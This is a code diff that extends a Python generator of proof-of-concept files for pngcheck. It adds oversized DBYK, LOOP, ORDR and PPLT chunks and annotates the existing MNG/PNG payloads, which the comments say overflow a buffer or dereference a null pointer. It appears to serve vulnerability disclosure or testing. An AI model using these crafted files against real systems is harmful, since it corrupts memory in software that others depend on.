@@ -55,13 +55,25 @@ def generate_poc(
 # caused by unchecked 'sz' variable exceeding BS in MNG chunk processing.
 # The sCAL case shows a null pointer dereference when pPixheight is uninitialized.
 POCS = {
+    # DBYK
+    # Command: pngcheck -f poc-dbyk.mng
+    "dbyk": (
+        MNG,
+        [
+            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
+            # chunk_name(4) + polarity(1) + keyword(2) * 20000
+            (b"DBYK", b"iCCP\x00" + b"A\x00" * 20000),
+            (b"MEND", b""),
+        ],
+    ),
     # DISC chunk
     # Command: pngcheck -v poc-disc.mng
     "disc": (
         MNG,
         [
             (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
-            (b"DISC", b"\x00\x01" * 20000),  # Large sz value
+            # discard_id(2) * 20000
+            (b"DISC", b"\x00\x01" * 20000),
             (b"MEND", b""),
         ],
     ),
@@ -71,7 +83,23 @@ POCS = {
         MNG,
         [
             (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
-            (b"DROP", b"ABCD" * 10000),  # Large sz value
+            # chunk_name(4) * 10000
+            (b"DROP", b"ABCD" * 10000),
+            (b"MEND", b""),
+        ],
+    ),
+    # Command: pngcheck -v poc-loop.mng
+    "loop": (
+        MNG,
+        [
+            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
+            (
+                b"LOOP",
+                b"\x00"  # nest_level(1)
+                + b"\x00\x00\x00\x01"  # iteration_count(4)
+                + b"\x00"  # termination_condition(1)
+                + b"\x00\x00\x00\x01" * 10000,  # Iteration_min(4) + ...
+            ),
             (b"MEND", b""),
         ],
     ),
@@ -81,7 +109,19 @@ POCS = {
         MNG,
         [
             (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
-            (b"nEED", b"A" * 40000),  # Large sz value
+            # (keyword(1) + separator(1)) * 20000
+            (b"nEED", b"A\x00" * 20000),
+            (b"MEND", b""),
+        ],
+    ),
+    # ORDR chunk
+    # Command: pngcheck poc-ordr.mng
+    "ordr": (
+        MNG,
+        [
+            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
+            # (chunk_name(4) + order_type(1)) * 8000
+            (b"ORDR", (b"tEXt\x00" * 8000)),
             (b"MEND", b""),
         ],
     ),
@@ -93,11 +133,25 @@ POCS = {
             (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
             (
                 b"PAST",
-                # dest_id + target_dtype + x,y coordinates + ...
-                b"\x00\x01"
-                + b"\x00"
-                + b"\x00" * 8
-                + (b"\x00" * 30) * 1500,  # Large sz value
+                b"\x00\x01"  # destination_id(2)
+                + b"\x00"  #  target_delta_type(1)
+                + b"\x00" * 8  # target_x(4) + target_y(4)
+                + (b"\x00" * 30) * 1500,  # (coordinates_pairs(30)) * 1500
+            ),
+            (b"MEND", b""),
+        ],
+    ),
+    # PPLT chunk
+    # Command: pngcheck poc-pplt.mng
+    "pplt": (
+        MNG,
+        [
+            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
+            (
+                b"PPLT",
+                b"\x04"  # pplt_delta_type(1)
+                + b"\x00\xff"  # first_index(1) + last_index(1),
+                + b"A" * 40000,  # set_of_samples(40000)
             ),
             (b"MEND", b""),
         ],
@@ -108,7 +162,8 @@ POCS = {
         MNG,
         [
             (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
-            (b"SAVE", b"\x04" + b"\x00" * 40000),  # Large sz value
+            # offset_size(1) + ... * 40000
+            (b"SAVE", b"\x04" + b"\x00" * 40000),
             (b"MEND", b""),
         ],
     ),
@@ -119,7 +174,8 @@ POCS = {
         [
             (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
             (b"SAVE", b"\x04test\x00"),
-            (b"SEEK", b"A" * 40000),  # Large sz value
+            # segment_name(40000)
+            (b"SEEK", b"A" * 40000),
             (b"MEND", b""),
         ],
     ),
@@ -129,6 +185,8 @@ POCS = {
         PNG,
         [
             (b"IHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00"),
+            # unit_specifier(1) + pixel_width(m) + null_separator + pixel_height(n)
+            #                                        [missing]         [missing]
             (b"sCAL", b"\x01" + b"1.0"),
             (b"IDAT", zlib.compress(b"\x00\x00\x00")),
             (b"IEND", b""),
